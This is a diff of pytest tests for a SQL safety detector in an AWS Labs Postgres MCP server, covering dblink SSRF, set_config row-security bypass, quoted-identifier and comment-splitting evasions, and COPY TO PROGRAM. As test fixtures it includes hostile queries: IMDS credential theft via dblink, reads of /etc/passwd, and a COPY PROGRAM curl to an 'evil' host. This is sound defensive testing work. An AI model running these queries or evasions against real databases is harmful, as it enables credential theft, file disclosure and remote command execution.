@@ -27,6 +27,9 @@ from awslabs.postgres_mcp_server.mutable_sql_detector import (
     SECURITY_SENSITIVE_GUCS,
     check_sql_injection_risk,
     detect_mutating_keywords,
+    normalize_for_detection,
+    strip_quoted_identifiers,
+    strip_sql_comments,
 )
 
 
@@ -379,8 +382,8 @@ class TestDangerousFunctions:
 
     def test_dangerous_functions_list_is_non_empty(self):
         """Sanity check that the blocklist hasn't been emptied accidentally."""
-        # 13 originals + 8 advisory + 1 pg_notify = 22.
-        assert len(DANGEROUS_FUNCTIONS) >= 22
+        # 13 originals + 8 advisory + 1 pg_notify + 9 dblink = 31.
+        assert len(DANGEROUS_FUNCTIONS) >= 31
         # The two specifically called out in the threat model must be
         # present; treat their absence as a regression.
         assert 'pg_cancel_backend' in DANGEROUS_FUNCTIONS
@@ -389,10 +392,103 @@ class TestDangerousFunctions:
         assert 'pg_advisory_lock' in DANGEROUS_FUNCTIONS
         assert 'pg_advisory_xact_lock' in DANGEROUS_FUNCTIONS
         assert 'pg_try_advisory_xact_lock_shared' in DANGEROUS_FUNCTIONS
+        # dblink family — SSRF.
+        assert 'dblink' in DANGEROUS_FUNCTIONS
+        assert 'dblink_connect' in DANGEROUS_FUNCTIONS
+        assert 'dblink_connect_u' in DANGEROUS_FUNCTIONS
 
     def test_safe_select_passes(self):
         """Confirm a benign SELECT yields no issues."""
         assert check_sql_injection_risk('SELECT id, name FROM users WHERE id = 1') == []
+
+
+class TestDblinkSsrf:
+    """dblink family functions are SSRF primitives.
+
+    These open outbound TCP connections from the database backend to an
+    arbitrary host:port. Before the fix they passed both gates
+    (detect_mutating_keywords and check_sql_injection_risk) and ran even
+    in read-only mode, allowing IMDS credential theft, internal-network
+    probing, and data exfiltration. They must now be rejected by the
+    dangerous-function check regardless of read/write mode.
+    """
+
+    @pytest.mark.parametrize(
+        'sql,expected_function',
+        [
+            # Open a raw connection — the core SSRF primitive.
+            (
+                "SELECT dblink_connect('host=10.0.0.1 port=6379 dbname=x connect_timeout=5')",
+                'dblink_connect',
+            ),
+            # IMDS credential-theft vector.
+            (
+                "SELECT dblink_connect('host=169.254.169.254 port=80 "
+                "dbname=latest/meta-data/iam/ connect_timeout=5')",
+                'dblink_connect',
+            ),
+            # Unprivileged-auth variant — must match the longer name, not
+            # the dblink_connect prefix.
+            (
+                "SELECT dblink_connect_u('host=attacker.com port=5432 dbname=x')",
+                'dblink_connect_u',
+            ),
+            # Connect-and-read in a single call.
+            (
+                "SELECT * FROM dblink('host=redis.internal port=6379 dbname=0', "
+                "'SELECT 1') AS t(r text)",
+                'dblink',
+            ),
+            (
+                "SELECT dblink_exec('conn', 'CREATE TABLE stolen(data text)')",
+                'dblink_exec',
+            ),
+            ("SELECT dblink_send_query('conn', 'SELECT 1')", 'dblink_send_query'),
+            ("SELECT dblink_open('conn', 'cur', 'SELECT 1')", 'dblink_open'),
+            ("SELECT dblink_fetch('conn', 'cur', 1)", 'dblink_fetch'),
+            ("SELECT dblink_close('conn', 'cur')", 'dblink_close'),
+            ('SELECT dblink_get_connections()', 'dblink_get_connections'),
+        ],
+    )
+    def test_dblink_function_rejected(self, sql, expected_function):
+        """Each dblink call site is rejected with a named reason."""
+        issues = check_sql_injection_risk(sql)
+        assert len(issues) == 1
+        assert issues[0]['type'] == 'sql'
+        assert issues[0]['severity'] == 'high'
+        assert expected_function in issues[0]['message']
+
+    def test_schema_qualified_dblink_rejected(self):
+        """Schema-qualified calls (public.dblink_connect) match."""
+        issues = check_sql_injection_risk(
+            "SELECT public.dblink_connect('host=10.0.0.1 port=22 dbname=x')"
+        )
+        assert len(issues) == 1
+        assert 'dblink_connect' in issues[0]['message']
+
+    def test_uppercase_dblink_rejected(self):
+        """Uppercase spellings an LLM might emit are still detected."""
+        issues = check_sql_injection_risk(
+            "SELECT DBLINK_CONNECT('host=169.254.169.254 port=80 dbname=x')"
+        )
+        assert len(issues) == 1
+        assert 'dblink_connect' in issues[0]['message'].lower()
+
+    def test_connect_u_resolves_to_longer_name(self):
+        """dblink_connect_u must report itself, not the dblink_connect prefix.
+
+        The two names are prefix-overlapping; the length-sorted
+        alternation must make the longer one win so the operator sees
+        the accurate function name.
+        """
+        issues = check_sql_injection_risk("SELECT dblink_connect_u('host=x port=5432 dbname=y')")
+        assert 'dblink_connect_u' in issues[0]['message']
+
+    def test_dblink_column_name_not_flagged(self):
+        """A column or identifier merely containing 'dblink' is not a call."""
+        issues = check_sql_injection_risk('SELECT dblink_status FROM connection_log')
+        for issue in issues:
+            assert 'Dangerous function call' not in issue['message']
 
 
 class TestSecuritySensitiveGucs:
@@ -438,13 +534,13 @@ class TestSecuritySensitiveGucs:
         """
         issues = check_sql_injection_risk('SET statement_timeout = 0')
         for issue in issues:
-            assert 'Security-sensitive SET' not in issue['message']
+            assert 'Security-sensitive session setting' not in issue['message']
 
     def test_guc_name_as_column_not_flagged(self):
         """Reading a column named row_security is not a SET and is allowed."""
         issues = check_sql_injection_risk('SELECT row_security FROM cfg')
         for issue in issues:
-            assert 'Security-sensitive SET' not in issue['message']
+            assert 'Security-sensitive session setting' not in issue['message']
 
     def test_security_guc_set_is_mode_independent(self):
         """A security GUC is rejected by the mode-independent check.
@@ -460,6 +556,510 @@ class TestSecuritySensitiveGucs:
     def test_security_sensitive_guc_set_contents(self):
         """Sanity check the GUC set has exactly the two intended entries."""
         assert SECURITY_SENSITIVE_GUCS == {'row_security', 'session_replication_role'}
+
+
+class TestSetConfigBypass:
+    """set_config() is the function form of SET and must be gated too.
+
+    Regression: SET row_security = off is gated, but the
+    equivalent set_config('row_security','off',false) previously passed
+    every check and ran even in read-only mode, disabling RLS and
+    breaking multi-tenant isolation.
+
+    The fix mirrors how SET itself is treated, giving two tiers:
+      - The two security-critical GUCs (row_security,
+        session_replication_role) are rejected in BOTH modes by
+        SECURITY_SET_CONFIG_PATTERN inside check_sql_injection_risk.
+      - Any other set_config target is treated like the SET keyword:
+        blocked in read-only mode via the SET_CONFIG mutating keyword,
+        but permitted in write mode (e.g. set_config('app.tenant_id',...)).
+    """
+
+    @pytest.mark.parametrize(
+        'sql,expected_guc',
+        [
+            ("SELECT set_config('row_security', 'off', false)", 'row_security'),
+            ("SELECT set_config('row_security','off',true)", 'row_security'),
+            (
+                "SELECT set_config('session_replication_role', 'replica', false)",
+                'session_replication_role',
+            ),
+            # Schema-qualified call.
+            (
+                "SELECT pg_catalog.set_config('row_security','off',false)",
+                'row_security',
+            ),
+            # Double-quoted function NAME (the quoted-identifier bypass);
+            # the GUC arg stays single-quoted as valid SQL requires.
+            (
+                "SELECT \"set_config\"('row_security','off',false)",
+                'row_security',
+            ),
+            # Extra whitespace.
+            ("SELECT set_config ( 'row_security' , 'off' , false )", 'row_security'),
+        ],
+    )
+    def test_security_guc_via_set_config_rejected_both_modes(self, sql, expected_guc):
+        """set_config targeting a security GUC is rejected mode-independently.
+
+        check_sql_injection_risk runs in both read and write mode, so a
+        non-empty result here proves the rejection holds even when the
+        server is write-enabled.
+        """
+        issues = check_sql_injection_risk(sql)
+        assert len(issues) == 1
+        assert issues[0]['severity'] == 'high'
+        assert expected_guc in issues[0]['message']
+        assert 'Security-sensitive session setting' in issues[0]['message']
+
+    def test_security_guc_via_set_config_uppercase(self):
+        """Uppercase SET_CONFIG spelling targeting a security GUC is rejected."""
+        issues = check_sql_injection_risk("SELECT SET_CONFIG('row_security','off',false)")
+        assert len(issues) == 1
+        assert 'row_security' in issues[0]['message']
+
+    @pytest.mark.parametrize(
+        'sql',
+        [
+            # Secondary vectors from the report. These are NOT security GUCs,
+            # so they are allowed in write mode but blocked in read-only mode
+            # (set_config behaves like SET).
+            "SELECT set_config('log_statement', 'none', false)",
+            "SELECT set_config('log_min_messages', 'panic', false)",
+            "SELECT set_config('statement_timeout', '0', false)",
+            "SELECT set_config('search_path', 'attacker_schema,public', false)",
+            # A benign session-context set in write mode.
+            "SELECT set_config('app.tenant_id', '42', false)",
+        ],
+    )
+    def test_non_security_set_config_blocked_in_readonly_only(self, sql):
+        """Non-security set_config is a read-only-mode block, not mode-independent.
+
+        It must be caught by the mutating-keyword gate (read-only mode)
+        but NOT by check_sql_injection_risk (which runs in both modes),
+        so a write-enabled server still permits it.
+        """
+        # Read-only gate catches it (SET_CONFIG mutating keyword).
+        assert 'SET_CONFIG' in detect_mutating_keywords(sql)
+        # Always-on gate does not, so write mode allows it.
+        assert check_sql_injection_risk(sql) == []
+
+    def test_set_config_not_in_dangerous_functions(self):
+        """set_config is intentionally NOT an unconditional dangerous function.
+
+        It is gated via the read-only mutating-keyword path plus the
+        security-GUC pattern, so a write-enabled server can still use it
+        for ordinary GUCs. Guards against a regression that would
+        re-block it in both modes.
+        """
+        assert 'set_config' not in DANGEROUS_FUNCTIONS
+
+    def test_set_config_keyword_blocks_in_readonly(self):
+        """The SET_CONFIG mutating keyword fires for any set_config call."""
+        assert 'SET_CONFIG' in detect_mutating_keywords(
+            "SELECT set_config('row_security','off',false)"
+        )
+
+    @pytest.mark.parametrize(
+        'sql',
+        [
+            # Identifier merely containing set_config as a substring.
+            'SELECT set_configuration FROM cfg',
+            # current_setting (read) is a different, benign function.
+            "SELECT current_setting('search_path')",
+        ],
+    )
+    def test_set_config_false_positives(self, sql):
+        """Benign look-alikes must not trip either set_config gate."""
+        assert detect_mutating_keywords(sql) == []
+        issues = check_sql_injection_risk(sql)
+        for issue in issues:
+            assert 'set_config' not in issue['message']
+            assert 'Security-sensitive session setting' not in issue['message']
+
+
+class TestQuotedIdentifierBypass:
+    """Double-quoted identifiers must not bypass the function / GUC checks.
+
+    Regression. PostgreSQL treats "pg_sleep"(1) as identical
+    to pg_sleep(1), but the detection regexes anchor on word boundaries
+    and a name-then-paren adjacency that the closing quote breaks, so the
+    quoted spelling previously passed every check — neutralizing the
+    entire DANGEROUS_FUNCTIONS blocklist and re-opening the dblink SSRF
+    and set_config RLS bypass. strip_quoted_identifiers() folds the
+    quotes off before matching so both spellings are caught.
+    """
+
+    @pytest.mark.parametrize(
+        'sql,expected',
+        [
+            ('SELECT "pg_sleep"(3)', 'pg_sleep'),
+            ('SELECT "pg_read_file"(\'/etc/passwd\')', 'pg_read_file'),
+            ('SELECT "pg_read_binary_file"(\'/x\')', 'pg_read_binary_file'),
+            ('SELECT "pg_ls_dir"(\'/etc\')', 'pg_ls_dir'),
+            ('SELECT "pg_stat_file"(\'/etc/passwd\')', 'pg_stat_file'),
+            ('SELECT "pg_terminate_backend"(123)', 'pg_terminate_backend'),
+            ('SELECT "pg_cancel_backend"(123)', 'pg_cancel_backend'),
+            ('SELECT "lo_export"(16384, \'/tmp/x\')', 'lo_export'),
+            ('SELECT "lo_import"(\'/etc/passwd\')', 'lo_import'),
+            ('SELECT "pg_reload_conf"()', 'pg_reload_conf'),
+            ('SELECT "pg_advisory_lock"(1)', 'pg_advisory_lock'),
+            ("SELECT \"pg_notify\"('c', 'm')", 'pg_notify'),
+            # The functions added in earlier fixes must stay covered too.
+            (
+                'SELECT "dblink_connect"(\'host=169.254.169.254 port=80 dbname=x\')',
+                'dblink_connect',
+            ),
+            # Whitespace between the closing quote and the paren.
+            ('SELECT "pg_sleep" (3)', 'pg_sleep'),
+            # No space before the opening quote (the " ends the SELECT
+            # token, so this is a valid call) — must not merge tokens.
+            ('SELECT"pg_sleep"(3)', 'pg_sleep'),
+            ('SELECT"pg_read_file"(\'/etc/passwd\')', 'pg_read_file'),
+            # Quoted schema qualifier as well as quoted function name.
+            ('SELECT "pg_catalog"."pg_sleep"(3)', 'pg_sleep'),
+        ],
+    )
+    def test_quoted_dangerous_function_rejected(self, sql, expected):
+        """Each quoted dangerous-function call is rejected and names the function."""
+        issues = check_sql_injection_risk(sql)
+        assert len(issues) == 1
+        assert issues[0]['severity'] == 'high'
+        assert expected in issues[0]['message']
+
+    def test_quoted_set_keyword_security_guc_rejected(self):
+        """SET "row_security" = off (quoted GUC name) is still rejected."""
+        issues = check_sql_injection_risk('SET "row_security" = off')
+        assert len(issues) == 1
+        assert 'row_security' in issues[0]['message']
+
+    def test_quoted_set_config_function_rejected(self):
+        """A double-quoted set_config name targeting a security GUC is rejected."""
+        issues = check_sql_injection_risk("SELECT \"set_config\"('row_security','off',false)")
+        assert len(issues) == 1
+        assert 'row_security' in issues[0]['message']
+
+    def test_unquoted_calls_still_rejected(self):
+        """The normalization must not regress the ordinary unquoted path."""
+        assert check_sql_injection_risk('SELECT pg_sleep(3)')
+        assert check_sql_injection_risk("SELECT pg_read_file('/etc/passwd')")
+
+    @pytest.mark.parametrize(
+        'sql',
+        [
+            # Reserved words used as quoted identifiers — a legitimate,
+            # common pattern that must keep working.
+            'SELECT "user", "order" FROM "select" WHERE id = 1',
+            # A column merely named like a dangerous function (no call).
+            'SELECT "pg_read_file" FROM cfg',
+            # Table name that embeds a function name as a substring.
+            'SELECT * FROM "pg_sleep_log"',
+            # Identifier with a space cannot spell a blocklisted name and
+            # is left alone (not a \\w+ match).
+            'SELECT "first name" FROM people',
+        ],
+    )
+    def test_benign_quoted_identifiers_allowed(self, sql):
+        """Legitimate quoted identifiers must not be flagged."""
+        assert check_sql_injection_risk(sql) == []
+
+    @pytest.mark.parametrize(
+        'sql,expected_keyword',
+        [
+            ('"INSERT" INTO t VALUES (1)', 'INSERT'),
+            ('"UPDATE" t SET a = 1', 'UPDATE'),
+            ('"DELETE" FROM t', 'DELETE'),
+            ('"DROP" TABLE t', 'DROP'),
+            ('"CREATE" TABLE t (id int)', 'CREATE'),
+            ("\"set_config\"('search_path', 'x', false)", 'SET_CONFIG'),
+        ],
+    )
+    def test_quoted_mutation_keyword_still_detected(self, sql, expected_keyword):
+        """Quoting a mutating keyword does not evade the read-only gate.
+
+        detect_mutating_keywords runs on the raw SQL and its word-boundary
+        anchors match at the quote characters, so "INSERT"/"DROP"/etc. are
+        still detected. (Quoting a DML/DDL keyword also turns it into an
+        identifier, so it is no longer a real mutation — but blocking it is
+        the safe direction.) This is the read-only-mode gate, distinct from
+        the quoted-function bypass the rest of this class covers.
+        """
+        assert expected_keyword in detect_mutating_keywords(sql)
+
+    def test_quoted_drop_also_flagged_by_injection_check(self):
+        """DROP additionally trips the always-on suspicious-pattern check.
+
+        The bare drop suspicious pattern matches the quoted spelling too,
+        so a write-mode server still rejects "DROP" TABLE.
+        """
+        assert check_sql_injection_risk('"DROP" TABLE t')
+
+
+class TestStripQuotedIdentifiers:
+    """Unit coverage for the strip_quoted_identifiers() normalization helper."""
+
+    @pytest.mark.parametrize(
+        'raw,expected',
+        [
+            ('SELECT "pg_sleep"(1)', 'SELECT pg_sleep (1)'),
+            # No space before the quote: the bare name must NOT merge into
+            # the preceding keyword (regression for the token-merge bypass).
+            ('SELECT"pg_sleep"(1)', 'SELECT pg_sleep (1)'),
+            ('"pg_catalog"."pg_sleep"', 'pg_catalog . pg_sleep'),
+            ('SET "row_security" = off', 'SET row_security = off'),
+            ('SET"row_security"=off', 'SET row_security =off'),
+            # The substitution is lexical: a double-quoted word inside a
+            # single-quoted literal is unwrapped too. Harmless (only
+            # removes quote chars / adds spaces) and documented behaviour.
+            ('SELECT \'a "quoted" word\'', "SELECT 'a quoted word'"),
+            # Identifiers with non-word characters are left intact.
+            ('SELECT "first name"', 'SELECT "first name"'),
+            # No quotes — returned unchanged.
+            ('SELECT pg_sleep(1)', 'SELECT pg_sleep(1)'),
+        ],
+    )
+    def test_strip(self, raw, expected):
+        """Double-quoted simple identifiers are unwrapped and space-padded.
+
+        Compared with runs of whitespace collapsed: the helper pads the
+        bare name with spaces to keep tokens from merging, and the exact
+        number of spaces is not contractually significant (every pattern
+        tolerates flexible whitespace).
+        """
+        normalized = ' '.join(strip_quoted_identifiers(raw).split())
+        assert normalized == ' '.join(expected.split())
+
+    def test_no_space_quoted_call_is_detected(self):
+        """End-to-end: SELECT"pg_sleep"(1) (no space) must be blocked.
+
+        A double quote ends the preceding token in PostgreSQL, so this is
+        a valid call. The space-padding in the helper preserves the token
+        boundary so the dangerous-function pattern still fires.
+        """
+        assert check_sql_injection_risk('SELECT"pg_sleep"(1)')
+        assert check_sql_injection_risk('SELECT"pg_read_file"(\'/etc/passwd\')')
+        assert check_sql_injection_risk('SET"row_security"=off')
+
+
+class TestCommentInjectionBypass:
+    """Inline comments must not let keywords/functions evade detection.
+
+    Regression. PostgreSQL treats /* */ block comments (which
+    nest) and -- line comments as whitespace, so INTO/**/OUTFILE,
+    pg_sleep/**/(1), SET/**/row_security and IMPORT/**/FOREIGN/**/SCHEMA
+    all execute normally while slipping past regexes that expect literal
+    whitespace between tokens. strip_sql_comments() folds comments to a
+    space before matching so the comment and non-comment spellings are
+    detected identically.
+    """
+
+    @pytest.mark.parametrize(
+        'sql,expected_fragment',
+        [
+            ('SELECT pg_sleep/**/(3)', 'pg_sleep'),
+            ("SELECT pg_read_file/**/('/etc/passwd')", 'pg_read_file'),
+            ("SELECT dblink_connect/**/('host=x')", 'dblink_connect'),
+            ('SET/**/row_security = off', 'row_security'),
+            ("SELECT set_config/**/('row_security','off',false)", 'row_security'),
+        ],
+    )
+    def test_comment_split_blocked_in_both_modes(self, sql, expected_fragment):
+        """A comment wedged before the paren / between SET and the GUC is caught."""
+        issues = check_sql_injection_risk(sql)
+        assert len(issues) == 1
+        assert expected_fragment in issues[0]['message']
+
+    @pytest.mark.parametrize(
+        'sql',
+        [
+            "SELECT * INTO/**/OUTFILE '/tmp/x' FROM t",
+            "SELECT load_file/**/('/etc/passwd')",
+            'SELECT sleep/**/(5)',
+        ],
+    )
+    def test_comment_split_suspicious_pattern_flagged(self, sql):
+        """Comment-split MySQL-ism file primitives still trip a suspicious pattern."""
+        assert check_sql_injection_risk(sql)
+
+    def test_comment_split_multiword_keyword_blocked_in_readonly(self):
+        """IMPORT/**/FOREIGN/**/SCHEMA must still register as a mutating keyword.
+
+        Without comment normalization the multi-word keyword splits and
+        IMPORT alone is not in the set, so the whole statement slips past
+        the read-only gate.
+        """
+        assert 'IMPORT FOREIGN SCHEMA' in detect_mutating_keywords(
+            'IMPORT/**/FOREIGN/**/SCHEMA public FROM SERVER s INTO local'
+        )
+
+    def test_line_comment_split_blocked(self):
+        """A -- line comment (newline-terminated) also normalizes to whitespace."""
+        sql = 'SELECT pg_sleep --x\n(3)'
+        assert check_sql_injection_risk(sql)
+
+    def test_nested_block_comment_handled(self):
+        """Nested /* /* */ */ comments (PostgreSQL allows nesting) are stripped."""
+        assert check_sql_injection_risk('SELECT pg_sleep/* /* nested */ */(3)')
+
+    def test_comment_marker_inside_string_is_not_a_comment(self):
+        """A /* or -- inside a single-quoted literal must be preserved.
+
+        Otherwise stripping it could corrupt the literal and change which
+        patterns match. Here the literal is benign and must be allowed.
+        """
+        sql = "SELECT id FROM t WHERE note = 'a /* b */ c'"
+        assert check_sql_injection_risk(sql) == []
+        assert detect_mutating_keywords(sql) == []
+
+    def test_comment_injection_heuristic_still_fires_on_raw(self):
+        """The '...-- comment-injection heuristic must survive comment-stripping.
+
+        It is evaluated against the raw SQL as well, so a trailing -- after
+        a string is still flagged even though the normalizer would remove it.
+        """
+        assert check_sql_injection_risk("SELECT * FROM t WHERE name = '' OR ''='' --")
+
+    @pytest.mark.parametrize(
+        'sql',
+        [
+            # Scary keywords / a semicolon that live only inside a comment
+            # must NOT be flagged: the normalizer folds the comment away and
+            # the suspicious patterns run on the normalized text.
+            'SELECT 1 /* DROP this idea */ FROM t',
+            'SELECT 1 /* TODO: grant access later */ FROM t',
+            'SELECT 1 -- truncate the log file someday\n',
+            'SELECT 1 -- ; SELECT 2\n',
+            'SELECT 1 /* union of ideas */ FROM t',
+        ],
+    )
+    def test_keyword_inside_comment_not_flagged(self, sql):
+        """Keywords appearing only inside comments are not false-positives."""
+        assert check_sql_injection_risk(sql) == []
+        assert detect_mutating_keywords(sql) == []
+
+
+class TestCopyProgramRce:
+    """COPY ... TO/FROM PROGRAM is server-side RCE.
+
+    COPY is gated in read-only mode as a mutating keyword, but the PROGRAM
+    form runs a shell command on the database host and must be rejected
+    even when writes are enabled. The mode-independent check lives in
+    check_sql_injection_risk.
+    """
+
+    @pytest.mark.parametrize(
+        'sql',
+        [
+            "COPY t TO PROGRAM 'curl http://evil/$(whoami)'",
+            "COPY t FROM PROGRAM 'whoami'",
+            "COPY (SELECT 1) TO PROGRAM 'id'",
+            # Comment-split and case variations.
+            "COPY t TO/**/PROGRAM 'id'",
+            "copy t to program 'id'",
+            "/* lead */ COPY t TO PROGRAM 'id'",
+        ],
+    )
+    def test_copy_program_rejected_both_modes(self, sql):
+        """Each COPY PROGRAM form is rejected with the RCE message."""
+        issues = check_sql_injection_risk(sql)
+        assert len(issues) == 1
+        assert 'PROGRAM' in issues[0]['message']
+        assert issues[0]['severity'] == 'high'
+
+    def test_plain_copy_to_file_not_rce_flagged(self):
+        """COPY ... TO '/file' (no PROGRAM) is not flagged by the RCE check.
+
+        It is still a mutating keyword (blocked in read-only mode), but the
+        always-on RCE check must not fire on it.
+        """
+        issues = check_sql_injection_risk("COPY t TO '/tmp/export.csv'")
+        for issue in issues:
+            assert 'PROGRAM' not in issue['message']
+        # But it is still caught by the read-only mutating-keyword gate.
+        assert 'COPY' in detect_mutating_keywords("COPY t TO '/tmp/export.csv'")
+
+    def test_copy_program_text_in_string_literal_not_flagged(self):
+        """The literal text 'COPY ... TO PROGRAM' inside a string value is fine.
+
+        The pattern is anchored at the statement start, so a SELECT whose
+        column value happens to contain that text is not over-blocked.
+        """
+        issues = check_sql_injection_risk(
+            "SELECT id FROM cmds WHERE body = 'COPY x TO PROGRAM cmd'"
+        )
+        for issue in issues:
+            assert 'PROGRAM' not in issue['message']
+
+    @pytest.mark.parametrize(
+        'sql',
+        [
+            # COPY PROGRAM as a SECOND statement. COPY_PROGRAM_PATTERN is
+            # anchored at the statement start so it does not match here, but
+            # any multi-statement query is rejected by the stacked-query
+            # suspicious pattern regardless of the whitespace after the ';'
+            # (the pattern's \\s* consumes a newline before the (?=\\S) check).
+            "SELECT 1;\nCOPY t TO PROGRAM 'id'",
+            "SELECT 1;\n\n  COPY t FROM PROGRAM 'whoami'",
+            "SELECT 1; COPY t TO PROGRAM 'id'",
+            "SELECT 1 ;\nCOPY t TO PROGRAM 'id'",
+            "SELECT 1;/* c */\nCOPY t TO PROGRAM 'id'",
+        ],
+    )
+    def test_copy_program_as_second_statement_is_blocked(self, sql):
+        """A newline/space-separated stacked COPY PROGRAM must not slip through.
+
+        Regression guard: the protection here comes from the stacked-query
+        pattern (multi-statement queries are rejected outright), not from
+        COPY_PROGRAM_PATTERN. If the stacked-query pattern is ever changed,
+        these assertions catch a reopened bypass.
+        """
+        assert check_sql_injection_risk(sql)
+        # Also blocked in read-only mode via the COPY mutating keyword.
+        assert 'COPY' in detect_mutating_keywords(sql)
+
+
+class TestStripSqlComments:
+    """Unit coverage for the comment-stripping normalizer."""
+
+    @pytest.mark.parametrize(
+        'raw,expected',
+        [
+            ('INTO/**/OUTFILE', 'INTO OUTFILE'),
+            ('a/* x */b', 'a b'),
+            ('SELECT 1 -- tail\nFROM t', 'SELECT 1  FROM t'),
+            ('SELECT 1 -- tail at eof', 'SELECT 1  '),
+            # Nested block comment.
+            ('a/* /* n */ */b', 'a b'),
+            # Comment marker inside a single-quoted string is preserved.
+            ("'a -- b'", "'a -- b'"),
+            ("'a /* b */ c'", "'a /* b */ c'"),
+            # Dollar-quoted body is preserved verbatim.
+            ('$$ a -- b /* c */ $$', '$$ a -- b /* c */ $$'),
+            # Escaped "" inside a double-quoted identifier: the identifier
+            # a"b is preserved (both quotes kept) and a trailing comment is
+            # still stripped. Exercises the "" escape branch.
+            ('"a""b"/* c */d', '"a""b" d'),
+            # A comment marker inside a double-quoted identifier is data,
+            # not a comment, and must be preserved.
+            ('"a/*b"', '"a/*b"'),
+            # Unterminated dollar-quoted string: copied verbatim to the end
+            # (the closing tag is never found). Exercises the end == -1 path.
+            ('$$ unterminated body', '$$ unterminated body'),
+            ('$tag$ also unterminated', '$tag$ also unterminated'),
+            # No comments — unchanged.
+            ('SELECT 1', 'SELECT 1'),
+        ],
+    )
+    def test_strip(self, raw, expected):
+        """Comments fold to a single space; literals are left intact."""
+        assert ' '.join(strip_sql_comments(raw).split()) == ' '.join(expected.split())
+
+    def test_normalize_combines_comment_and_quote_handling(self):
+        """normalize_for_detection folds comments then unwraps quoted idents."""
+        normalized = normalize_for_detection('SELECT "pg_sleep"/**/(1)')
+        assert 'pg_sleep' in normalized
+        assert '"' not in normalized
+        assert '/*' not in normalized
 
 
 class TestLegitimateReadQueriesAllowed:
@@ -527,6 +1127,9 @@ class TestLegitimateReadQueriesAllowed:
         'SELECT EXTRACT(YEAR FROM created_at) FROM orders',
         # Plain EXPLAIN (without ANALYZE) is a read-only planner inspection
         'EXPLAIN SELECT * FROM t',
+        # Benign comments must not cause over-blocking.
+        'SELECT 1 /* inline note */ FROM t',
+        'SELECT id FROM users -- trailing note\nWHERE id = 1',
     ]
 
     @pytest.mark.parametrize('sql', ALLOWED_QUERIES)
@@ -569,4 +1172,47 @@ class TestKnownFalsePositives:
         appearing inside a quoted string. Accepted limitation.
         """
         issues = check_sql_injection_risk("SELECT * FROM t WHERE note = 'see comment -- here'")
+        assert len(issues) >= 1
+
+    def test_quoted_reserved_word_column_over_blocked_in_readonly(self):
+        """A column quoted to reuse a reserved word is over-blocked in readonly.
+
+        SELECT "update" FROM t reads a column literally named update; the
+        double quotes make it an identifier, not the UPDATE command. But
+        detect_mutating_keywords runs on the raw SQL and its word-boundary
+        regex matches inside the quotes, so it is flagged as UPDATE and
+        rejected in read-only mode. This is the accepted false positive
+        discussed for the regex approach — the safe direction (over-block)
+        — and would require true SQL parsing to resolve. The always-on
+        injection check does NOT flag it, so a write-enabled server still
+        allows it.
+        """
+        assert 'UPDATE' in detect_mutating_keywords('SELECT "update" FROM t')
+        # The mode-independent check does not over-block it.
+        assert check_sql_injection_risk('SELECT "update" FROM t') == []
+
+    def test_mutating_keyword_inside_string_literal_over_blocked_in_readonly(self):
+        """A mutating keyword appearing inside a string VALUE is over-blocked.
+
+        detect_mutating_keywords matches keyword *words* anywhere in the
+        SQL, including inside single-quoted string literals, so a benign
+        read like SELECT ... WHERE note = 'how to COPY a table' is rejected
+        in read-only mode. Distinguishing a keyword from string data needs
+        real parsing; over-blocking is the accepted safe direction. The
+        always-on injection check itself does not add a block here (the COPY
+        RCE pattern is anchored at statement start).
+        """
+        sql = "SELECT id FROM t WHERE body = 'how to COPY a table'"
+        assert 'COPY' in detect_mutating_keywords(sql)
+        assert check_sql_injection_risk(sql) == []
+
+    def test_dangerous_function_text_inside_string_literal_over_blocked(self):
+        """Dangerous-function text inside a string literal trips the check.
+
+        SELECT ... WHERE q = 'SELECT pg_sleep(1)' contains the literal text
+        pg_sleep( inside a string value; the regex cannot tell it is data,
+        so it is rejected in both modes. Accepted limitation — resolving it
+        needs literal-aware parsing.
+        """
+        issues = check_sql_injection_risk("SELECT q FROM t WHERE q = 'SELECT pg_sleep(1)'")
         assert len(issues) >= 1
